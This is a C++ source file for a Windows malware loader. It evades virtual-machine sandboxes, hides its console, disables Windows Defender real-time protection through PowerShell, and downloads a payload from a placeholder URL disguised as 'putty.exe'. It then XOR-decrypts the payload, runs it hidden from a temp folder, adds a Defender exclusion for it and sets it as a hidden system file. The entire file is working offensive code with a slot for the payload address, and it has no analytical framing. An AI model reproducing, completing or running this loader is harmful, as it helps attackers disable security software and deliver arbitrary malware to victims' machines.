#include <iostream>
#include <windows.h>
#include <urlmon.h>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <sstream>

#pragma comment(lib, "urlmon.lib")

const std::string kEncKey = "gonnacry@rockyou";

// Generate a random string
std::string RandomString(size_t length) {
    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> distribution(0, characters.size() - 1);
    for (size_t i = 0; i < length; ++i) {
        result += characters[distribution(generator)];
    }
    return result;
}

// Encrypt or decrypt data with XOR
std::string EncryptDecrypt(const std::string& data, const std::string& key) {
    std::string output = data;
    size_t keyLength = key.size();
    for (size_t i = 0; i < output.size(); ++i) {
        output[i] ^= key[i % keyLength];
    }
    return output;
}

// Detect if the program is running in a VM
bool IsRunningInVM() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        return false;
    }
    
    std::string vmDetection[] = {"vmware", "virtualbox", "kvm", "qemu", "xen", "hyperv"};
    for (const auto& vmName : vmDetection) {
        std::string path = "C:\\Windows\\System32\\drivers\\" + vmName + ".sys";
        if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }
    return false;
}

// Hide console window
void HideConsoleWindow() {
    HWND hConsole = GetConsoleWindow();
    if (hConsole) {
        ShowWindow(hConsole, SW_HIDE);
    }
}

// Disable Windows Defender
void DisableWindowsDefender() {
    std::cout << "Disabling Windows Defender..." << std::endl;
    system("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true;\"");
}

// Download file from URL
void DownloadFile(const std::string& url, const std::string& destination) {
    std::cout << "Downloading file from " << url << " to " << destination << std::endl;
    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destination.c_str(), 0, NULL);
    if (FAILED(hr)) {
        std::cerr << "Failed to download file. HRESULT: " << hr << std::endl;
        exit(EXIT_FAILURE);
    }
}

// Add Windows Defender exclusion
void AddDefenderExclusion(const std::string& path) {
    std::cout << "Adding Windows Defender exclusion for " << path << std::endl;
    std::string command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath \\\"" + path + "\\\"\"";
    system(command.c_str());
}

// Set file attributes to hidden and system
void SetFileAttributesHidden(const std::string& path) {
    std::cout << "Setting file attributes to hidden and system for " << path << std::endl;
    if (!SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        std::cerr << "Failed to set file attributes." << std::endl;
    }
}

// Execute a file in memory
void ExecuteInMemory(const std::string& filePath, const std::string& key) {
    std::ifstream fileIn(filePath, std::ios::binary);
    if (!fileIn) {
        std::cerr << "Failed to open file for decryption." << std::endl;
        return;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
    fileIn.close();

    std::string encryptedData(buffer.begin(), buffer.end());
    std::string decryptedData = EncryptDecrypt(encryptedData, key);

    std::string tempPath = "C:\\Windows\\Temp\\temp_decrypted.exe";
    std::ofstream fileOut(tempPath, std::ios::binary);
    fileOut.write(decryptedData.c_str(), decryptedData.size());
    fileOut.close();

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, const_cast<LPSTR>(tempPath.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "Failed to create process. Error: " << GetLastError() << std::endl;
    }
}

// Encrypt a file
void EncryptFile(const std::string& filePath, const std::string& key) {
    std::ifstream fileIn(filePath, std::ios::binary);
    if (!fileIn) {
        std::cerr << "Failed to open file for encryption." << std::endl;
        return;
    }

    std::vector<char> buffer((std::istreambuf_iterator<char>(fileIn)), std::istreambuf_iterator<char>());
    std::string data(buffer.begin(), buffer.end());
    std::string encryptedData = EncryptDecrypt(data, key);

    std::ofstream fileOut(filePath, std::ios::binary);
    fileOut.write(encryptedData.c_str(), encryptedData.size());
    fileIn.close();
    fileOut.close();
}

int main() {
    std::cout << "Starting program..." << std::endl;

    if (IsRunningInVM()) {
        std::cerr << "Program detected to be running in a VM. Exiting." << std::endl;
        return EXIT_FAILURE;
    }

    HideConsoleWindow();
    DisableWindowsDefender();

    std::string url = "https://YourPayload/Path.exe";
    std::string destination = std::string(getenv("ProgramData")) + "\\putty.exe";
    DownloadFile(url, destination);

    EncryptFile(destination, kEncKey);

    Sleep(2000);

    ExecuteInMemory(destination, kEncKey);

    AddDefenderExclusion(destination);
    SetFileAttributesHidden(destination);

    std::cout << "Program finished." << std::endl;
    return 0;
}

